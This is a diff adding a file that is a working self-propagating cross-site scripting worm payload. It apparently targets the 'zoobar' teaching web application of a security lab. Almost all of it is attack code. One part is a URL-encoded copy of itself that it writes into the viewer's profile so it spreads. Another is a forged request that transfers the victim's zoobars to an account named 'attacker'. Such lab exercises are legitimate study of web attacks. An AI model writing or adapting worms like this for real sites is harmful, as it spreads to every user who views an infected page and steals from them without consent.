@@ -1,0 +1,14 @@
+why always me?
+<script>
+    var why = "why%20always%20me%3F%3C";
+    var content = "var%20profile%20%3D%20new%20XMLHttpRequest()%3B%20profile.open('POST'%2C%20'%2Fzoobar%2Findex.cgi%2F')%3B%20profile.setRequestHeader('Content-type'%2C'application%2Fx-www-form-urlencoded')%3B%20profile.send('profile_update%3D'%20%2B%20encodeURIComponent('why%20always%20me%3F%3Cscript%3Evar%20why%20%3D%22'%20%2B%20why%20%2B%20'%22%3B')%20%2B%20encodeURIComponent('var%20content%20%3D%22'%20%2B%20content%20%2B%20'%22%3B')%20%2B%20content%20%2B%20'%26profile_submit%3DSave')%3B%20var%20steal%20%3D%20new%20XMLHttpRequest()%3B%20steal.open('POST'%2C%20'%2Fzoobar%2Findex.cgi%2Ftransfer')%3B%20steal.setRequestHeader('Content-type'%2C'application%2Fx-www-form-urlencoded')%3B%20steal.send('zoobars%3D1%26recipient%3Dattacker%26submission%3DSend')%3B%20total%20%3D%2010%3B%20%3C%2Fscript%3E%3Cspan%20id%3D%22zoobars%22%20class%3D%2210%22%3E%3C%2Fspan%3E";
+    var profile = new XMLHttpRequest();
+    profile.open('POST', '/zoobar/index.cgi/');
+    profile.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+    profile.send('profile_update=' + encodeURIComponent('why always me?<script>var why ="' + why + '";') + encodeURIComponent('var content ="' + content + '";') + content + '&profile_submit=Save');
+    var steal = new XMLHttpRequest();
+    steal.open('POST', '/zoobar/index.cgi/transfer');
+    steal.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+    steal.send('zoobars=1&recipient=attacker&submission=Send');
+</script>
+<span id="zoobars" class="10"></span>
